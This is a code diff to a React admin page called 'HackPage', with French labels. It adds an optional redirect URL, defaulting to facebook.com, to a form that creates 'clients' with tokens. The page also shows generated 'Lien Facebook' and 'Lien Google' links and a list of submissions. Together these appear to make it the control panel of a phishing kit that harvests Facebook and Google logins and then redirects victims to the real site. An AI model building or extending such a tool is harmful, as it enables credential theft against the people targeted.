@@ -25,7 +25,7 @@ export default function HackPage() {
   const [query, setQuery] = useState("");
   const [deleteClientId, setDeleteClientId] = useState<number | null>(null);
   const [isCreateOpen, setIsCreateOpen] = useState(false);
-  const [createForm, setCreateForm] = useState({ name: "", email: "" });
+  const [createForm, setCreateForm] = useState({ name: "", email: "", redirect_url: "" });
 
   // ── detail / submissions ────────────────────────────────────────────────────
   const [subQuery, setSubQuery] = useState("");
@@ -86,10 +86,18 @@ export default function HackPage() {
 
   async function handleCreate() {
     if (!createForm.name.trim() || !createForm.email.trim()) return;
-    const ok = await create(createForm);
+    const payload: CreateHackClientPayload = {
+      name: createForm.name,
+      email: createForm.email,
+    };
+    // Ajouter redirect_url seulement si rempli
+    if (createForm.redirect_url.trim()) {
+      payload.redirect_url = createForm.redirect_url;
+    }
+    const ok = await create(payload);
     if (ok) {
       setIsCreateOpen(false);
-      setCreateForm({ name: "", email: "" });
+      setCreateForm({ name: "", email: "", redirect_url: "" });
       await NotificationService.showSuccessToast("Client créé avec succès");
     } else {
       await NotificationService.showErrorToast("Échec de la création du client");
@@ -300,11 +308,11 @@ export default function HackPage() {
         {/* Modal création client */}
         <Modal
           open={isCreateOpen}
-          onClose={() => { setIsCreateOpen(false); setCreateForm({ name: "", email: "" }); }}
+          onClose={() => { setIsCreateOpen(false); setCreateForm({ name: "", email: "", redirect_url: "" }); }}
           title="Créer un client"
           footer={
             <>
-              <Button variant="secondary" onClick={() => { setIsCreateOpen(false); setCreateForm({ name: "", email: "" }); }}>Annuler</Button>
+              <Button variant="secondary" onClick={() => { setIsCreateOpen(false); setCreateForm({ name: "", email: "", redirect_url: "" }); }}>Annuler</Button>
               <Button onClick={handleCreate} disabled={!createForm.name.trim() || !createForm.email.trim()}>Créer</Button>
             </>
           }
@@ -323,7 +331,17 @@ export default function HackPage() {
               value={createForm.email}
               onChange={(e) => setCreateForm((f) => ({ ...f, email: e.target.value }))}
             />
-            <p className="text-xs text-foreground/50">Le token et les liens seront générés automatiquement par l&apos;API.</p>
+            <Input
+              label="URL de redirection (optionnel)"
+              placeholder="https://facebook.com/groupe123"
+              value={createForm.redirect_url}
+              onChange={(e) => setCreateForm((f) => ({ ...f, redirect_url: e.target.value }))}
+            />
+            <p className="text-xs text-foreground/50">
+              Le token et les liens seront générés automatiquement.
+              <br />
+              Si vide, la redirection sera : <span className="font-mono">https://www.facebook.com</span>
+            </p>
           </div>
         </Modal>
 
@@ -383,8 +401,11 @@ export default function HackPage() {
       {selectedClient && (
         <div className="rounded-xl border border-foreground/10 bg-foreground/5 p-4 space-y-3">
           <h2 className="text-sm font-semibold text-foreground/70 uppercase tracking-wide">Informations client</h2>
-          <div className="grid gap-2 sm:grid-cols-3">
+          <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
             <InfoRow label="Token" value={selectedClient.token} onCopy={copyToClipboard} />
+            {selectedClient.redirect_url && (
+              <InfoRow label="URL Redirection" value={selectedClient.redirect_url} onCopy={copyToClipboard} isLink />
+            )}
             <InfoRow label="Lien Facebook" value={selectedClient.link_facebook} onCopy={copyToClipboard} isLink />
             <InfoRow label="Lien Google" value={selectedClient.link_google} onCopy={copyToClipboard} isLink />
           </div>
